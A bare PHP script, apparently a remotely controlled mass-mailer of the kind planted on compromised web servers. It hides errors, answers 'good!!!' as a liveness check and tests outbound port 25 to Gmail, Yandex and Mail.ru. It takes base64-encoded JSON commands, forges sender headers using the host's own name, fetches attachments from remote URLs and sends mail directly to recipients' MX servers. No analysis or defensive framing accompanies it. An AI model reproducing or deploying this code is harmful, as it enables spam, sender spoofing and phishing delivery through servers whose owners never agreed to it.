<?php
    error_reporting(0);

    $start_time = mktime();

    if ($_REQUEST['check'] == '1') {
	$mxs = array(
		    'gmail-smtp-in.l.google.com',
		    'mx.yandex.ru',
		    'mxs.mail.ru'
		);

	foreach($mxs as $mx) {
	    $smtp = fsockopen($mx, 25, $errno, $errstr, 1);
	    stream_set_timeout($smtp, 1);
	    fwrite($smtp, "HELO ".$mx."\r\n");
	    $read = fgets($smtp);

	    if (preg_match('/220/', $read)) {
		$out[] = 'OK';
	    } else {
		$out[] = 'NO';
	    }
	}

	if(in_array('OK', $out)) {
//	    echo php_uname('s');
	    echo 'OK';
	} else {
	    echo 'NO';
	}
	die();
    }

    if (!$_POST['data']) {
	echo "good!!!";
	die();
    }

    $data = json_decode(base64_decode(str_replace(' ', '+', $_POST['data'])), true);

    if (!empty($data['to'])) {
	$boundary = '--' . md5(uniqid(time()));

	// Change [HOST]
	$data['from'] = str_replace('[HOST]', $_SERVER['SERVER_NAME'], $data['from']);
	$data['subj'] = str_replace('[HOST]', $_SERVER['SERVER_NAME'], $data['subj']);
	$data['text'] = str_replace('[HOST]', $_SERVER['SERVER_NAME'], $data['text']);

	$sender = explode('@', $data['from']);
	$domain = $sender[1];
	$sender = $sender[0];

	$recipient = explode('@', $data['to']);
	$recipient = $recipient[0];

	$data['header'] = 'From: =?utf-8?B?'. base64_encode($data['name']).'?= <'.$data['from'].'>';
	$data['header'] .= PHP_EOL.'To: '.$data['to'];
	$data['header'] .= PHP_EOL.'Subject: '.$data['subj'];
	$data['header'] .= PHP_EOL.'Message-ID: '.md5($sender . $recipient).'@'.$domain;
	$data['header'] .= PHP_EOL.'MIME-Version: 1.0';

	if (!empty($data['attach'])) {
	    $data['header'] .= PHP_EOL.'Content-Type: multipart/mixed; boundary="'.$boundary.'"';
	} else {
	    $data['header'] .= PHP_EOL.'Content-Type: '.$data['type'].'; charset=UTF-8;';
	}

	if (!empty($data['attach'])) {
	    $text = $data['text'];
	    $data['text'] = '--'.$boundary;
	    $data['text'] .= PHP_EOL.'Content-Type: '.$data['type'].'; charset=UTF-8;';
	    $data['text'] .= PHP_EOL.'Content-Transfer-Encoding: base64'.PHP_EOL;
	    $data['text'] .= PHP_EOL.chunk_split(base64_encode($text));

	    foreach($data['attach'] as $attach) {
		$file = file_get_contents($attach['url']);
		if (!empty($file)) {
		    $data['text'] .= PHP_EOL.'--'.$boundary;
		    $data['text'] .= PHP_EOL.'Content-Type: '.$attach['mime'].'; name = "'.$attach['name'].'"';
		    $data['text'] .= PHP_EOL.'Content-Transfer-Encoding: base64'.PHP_EOL;
		    $data['text'] .= PHP_EOL.chunk_split(base64_encode($file));
		} else {
		    $time = (mktime()-$start_time);
		    $arr = array(
				'id' => $data['id'],
				'from' => $data['from'],
				'name' => $data['name'],
				'to' => $data['to'],
				'result' => 'NO',
				'time' => $time,
				'errors' => 'attach'
			    );

		    echo base64_encode(json_encode($arr));
		    die();
		}
	    }
	}

	$data['header'] = str_replace('[HOST]', $_SERVER['SERVER_NAME'], $data['header'])."\n";


	$domain = explode('@', $data['to']);
	$domain = dns_get_record($domain[1], DNS_MX);

	$mx = '';
	foreach ($domain as $res) {
	    $mx = $res['target'];
	    break;
	}

	if (!$mx) {
	    $time = (mktime()-$start_time);
	    $arr = array(
			'id' => $data['id'],
			'from' => $data['from'],
			'name' => $data['name'],
			'to' => $data['to'],
			'result' => 'NO',
			'time' => $time,
			'errors' => 'mx'
		    );

	    echo base64_encode(json_encode($arr));
	    die();
	}

	$arr = array(
		    'mx' => $mx,
		    'from' => $data['from'],
		    'to' => $data['to'],
		    'subj' => $data['subj'],
		    'text' => $data['text'],
		    'header' => $data['header']
		);

	$result = send_smtp($arr);

	$arr = array(
		    'id' => $data['id'],
		    'from' => $data['from'],
		    'name' => $data['name'],
		    'to' => $data['to'],
		    'result' => $result[0],
		    'time' => $result[1],
		    'errors' => $result[2]
		);
    }

    echo base64_encode(json_encode($arr));

    function send_smtp($data) {
	global $start_time;

	$smtp = fsockopen($data['mx'], 25, $errno, $errstr, 1);

	stream_set_timeout($smtp, 1);

	fwrite($smtp, 'HELO '.$data['mx']."\r\n");
	$reply[] = 'HELO '.$data['mx']."\r\n";
	$reply[] = fgets($smtp);

	fwrite($smtp, 'MAIL FROM:<'.$data['from'].'>'."\r\n");
	$reply[] = 'MAIL FROM:<'.$data['from'].'>'."\r\n";
	$reply[] = fgets($smtp);

	fwrite($smtp, 'RCPT TO:<'.$data['to'].'>'."\r\n");
	$reply[] = 'RCPT TO:<'.$data['to'].'>'."\r\n";
	$reply[] = fgets($smtp);

	fwrite($smtp, 'DATA' . "\r\n");
	$reply[] = 'DATA' . "\r\n";
	$reply[] = fgets($smtp);

	$headers = '';
	foreach (explode("\n", $data['header']) as $val) {
	    $headers .= $val."\r\n";
	}

	fwrite($smtp, $headers."\r\n");
	$reply[] = $headers."\r\n\r\n";
	$reply[] = fgets($smtp);

	fwrite($smtp, $data['text']."\r\n");
	$reply[] = $data['text']."\r\n";
	$reply[] = fgets($smtp);

	fwrite($smtp, "\r\n".'.'."\r\n");
	$reply[] = "\r\n".'.'."\r\n";
	$reply[] = $reply[] = fgets($smtp);

	fwrite($smtp, 'QUIT'."\r\n");
	$reply[] = 'QUIT'."\r\n";
	$reply[] = fgets($smtp);

	fclose($smtp);

//	var_dump($reply);

	$smtp_errors = "421,422,431,432,441,442,446,447,449,450,451,452,471,500,501,502,503,504,510,511,512,513,523,530,541,550,551,552,553,554";
	foreach(explode(',', $smtp_errors) as $err) {
	    if(preg_grep('/^'.$err.'/i', $reply)) {
		$errors[] = $err;
	    }
	}

	$time = (mktime()-$start_time);
	if($errno || $errors) {
	    return array('NO',$time,implode(",", $errors));
	} else {
	    return array('OK',$time,'');
	}
    }
?>
